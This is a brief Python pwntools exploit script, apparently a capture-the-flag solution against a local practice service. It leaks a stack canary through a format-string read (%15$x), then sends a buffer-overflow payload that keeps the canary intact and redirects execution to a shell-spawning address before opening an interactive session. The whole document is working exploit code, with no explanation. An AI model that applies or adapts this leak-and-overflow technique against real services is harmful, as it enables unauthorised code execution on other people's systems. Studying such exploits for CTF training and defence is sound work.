from pwn import *

io = remote('127.0.0.1', '10001')

io.sendline("%15$x")
canary = int(io.recv(), 16)
log.info("canary: 0x%x" % canary)

binsh = 0x804854D		# canary_protect_me
payload = "A"*0x28 + p32(canary) + "A"*0xc + p32(binsh)
io.sendline(payload)
io.interactive()

